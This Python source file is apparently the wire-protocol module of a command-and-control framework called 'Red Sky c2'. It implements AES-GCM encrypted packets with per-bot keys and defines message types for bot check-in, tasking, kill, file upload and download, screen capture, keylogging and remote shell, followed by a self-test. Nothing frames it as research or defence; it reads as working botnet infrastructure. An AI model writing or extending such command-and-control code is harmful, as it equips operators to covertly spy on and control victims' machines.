# language: Python, file: Program/c2/protocol.py, target: Red Sky c2 — wire protocol
# AES-GCM encrypted packets. Every message is:
#   [ 4-byte magic ][ 1-byte version ][ 1-byte type ][ 12-byte nonce ]
#   [ 2-byte ciphertext_len ][ ciphertext + 16-byte tag ]
# Key is per-bot, shared at build time. Nonce is random per packet.

import json
import os
import struct
import time
from dataclasses import dataclass, field, asdict
from typing import Any, Dict, Optional

from cryptography.hazmat.primitives.ciphers.aead import AESGCM


MAGIC = b"RSKY"
VERSION = 1

# message types
MT_CHECKIN   = 0x01
MT_TASK      = 0x02
MT_RESULT    = 0x03
MT_PING      = 0x04
MT_PONG      = 0x05
MT_KILL      = 0x06
MT_CONFIG    = 0x07
MT_FILE_UP   = 0x08
MT_FILE_DOWN = 0x09
MT_SCREEN    = 0x0A
MT_KEYLOG    = 0x0B
MT_SHELL     = 0x0C

TYPE_NAMES = {
    MT_CHECKIN:   "checkin",
    MT_TASK:      "task",
    MT_RESULT:   "result",
    MT_PING:      "ping",
    MT_PONG:      "pong",
    MT_KILL:      "kill",
    MT_CONFIG:    "config",
    MT_FILE_UP:   "file_up",
    MT_FILE_DOWN: "file_down",
    MT_SCREEN:    "screen",
    MT_KEYLOG:    "keylog",
    MT_SHELL:     "shell",
}


@dataclass
class Message:
    type: int
    payload: Dict[str, Any] = field(default_factory=dict)
    ts: float = field(default_factory=time.time)

    def type_name(self) -> str:
        return TYPE_NAMES.get(self.type, f"0x{self.type:02x}")

    def to_dict(self) -> Dict:
        return asdict(self)


class ProtocolError(Exception):
    pass


def _aes(key: bytes) -> AESGCM:
    if len(key) not in (16, 24, 32):
        raise ProtocolError(f"invalid AES key length: {len(key)}")
    return AESGCM(key)


def encode_packet(msg: Message, key: bytes) -> bytes:
    """Serialize + encrypt a Message into a wire-format packet."""
    plaintext = json.dumps({
        "type": msg.type,
        "payload": msg.payload,
        "ts": msg.ts,
    }).encode()

    nonce = os.urandom(12)
    aes = _aes(key)
    ciphertext = aes.encrypt(nonce, plaintext, MAGIC)

    if len(ciphertext) > 0xFFFF:
        raise ProtocolError("payload too large (max 64KB)")

    return (
        MAGIC +
        bytes([VERSION]) +
        bytes([msg.type]) +
        nonce +
        struct.pack(">H", len(ciphertext)) +
        ciphertext
    )


def decode_packet(data: bytes, key: bytes) -> Message:
    """Decrypt + deserialize a wire-format packet."""
    if len(data) < 4 + 1 + 1 + 12 + 2:
        raise ProtocolError("packet too short")
    if data[:4] != MAGIC:
        raise ProtocolError(f"bad magic: {data[:4]!r}")

    version = data[4]
    if version != VERSION:
        raise ProtocolError(f"unsupported version: {version}")

    msg_type = data[5]
    nonce = data[6:18]
    ct_len = struct.unpack(">H", data[18:20])[0]
    ciphertext = data[20:20 + ct_len]

    if len(ciphertext) != ct_len:
        raise ProtocolError("truncated ciphertext")

    aes = _aes(key)
    try:
        plaintext = aes.decrypt(nonce, ciphertext, MAGIC)
    except Exception as e:
        raise ProtocolError(f"decryption failed: {e}")

    try:
        obj = json.loads(plaintext)
    except json.JSONDecodeError as e:
        raise ProtocolError(f"bad JSON: {e}")

    return Message(
        type=obj.get("type", msg_type),
        payload=obj.get("payload", {}),
        ts=obj.get("ts", time.time()),
    )


def gen_bot_key() -> bytes:
    return os.urandom(32)


def key_hex(key: bytes) -> str:
    return key.hex()


def key_from_hex(h: str) -> bytes:
    return bytes.fromhex(h)


# ── self-test ──
if __name__ == "__main__":
    k = gen_bot_key()
    m = Message(type=MT_CHECKIN, payload={"hostname": "test-pc", "user": "nono"})
    pkt = encode_packet(m, k)
    print(f"encoded {len(pkt)} bytes")
    back = decode_packet(pkt, k)
    print(f"decoded: {back.type_name()} {back.payload}")
    assert back.payload == m.payload
    print("protocol round-trip OK")
